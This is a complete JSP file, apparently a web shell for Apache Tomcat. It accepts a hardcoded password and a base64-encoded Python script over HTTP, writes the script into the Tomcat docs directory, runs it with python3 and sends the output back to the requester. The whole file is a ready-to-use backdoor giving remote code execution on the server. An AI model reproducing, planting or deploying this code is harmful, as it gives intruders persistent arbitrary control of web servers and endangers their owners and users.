<%@ page import="java.io.*, java.util.*, javax.servlet.*, javax.servlet.http.*, java.util.Base64" %>
<%
    final String hardcodedPassword = "TheHermitKingdom2024__";

    String password = request.getParameter("password");
    String base64Script = request.getParameter("script");

    if (password == null || !password.trim().equals(hardcodedPassword)) {
        out.print("Authentication failed: Incorrect password.");
        return;
    }

    if (base64Script == null || base64Script.isEmpty()) {
        out.print("Error: No script provided.");
        return;
    }

    String virtualPackageDir = "/opt/tomcat/webapps/docs/netspi/netspi/aggregate/";
    File dir = new File(virtualPackageDir);
    if (!dir.exists()) {
        dir.mkdirs();
    }

    File tempScriptFile = null;
    try {
        String decodedScript = new String(Base64.getDecoder().decode(base64Script));
        tempScriptFile = new File(virtualPackageDir, "temp_script.py");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempScriptFile))) {
            writer.write(decodedScript);
        }

        String pythonPath = "python3";
        ProcessBuilder pb = new ProcessBuilder(pythonPath, tempScriptFile.getAbsolutePath());
        pb.environment().put("PYTHONPATH", virtualPackageDir);

        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

        StringBuilder output = new StringBuilder();
        String line;
        boolean isHtml = false;

        while ((line = reader.readLine()) != null) {
            if (line.trim().startsWith("<html>")) {
                isHtml = true;
                output.append("<html-output>").append(line).append("\n");
            } else if (isHtml && line.trim().endsWith("</html>")) {
                output.append(line).append("</html-output>").append("\n");
                isHtml = false;
            } else {
                output.append(line).append("\n");
            }
        }
        while ((line = errorReader.readLine()) != null) {
            output.append("ERROR: ").append(line).append("\n");
        }

        reader.close();
        errorReader.close();

        out.print(output.toString());
    } catch (Exception e) {
        e.printStackTrace();
        out.print("Error processing the script: " + e.getMessage());
    } finally {
        if (tempScriptFile != null && tempScriptFile.exists()) {
            tempScriptFile.delete();
        }
    }
%>
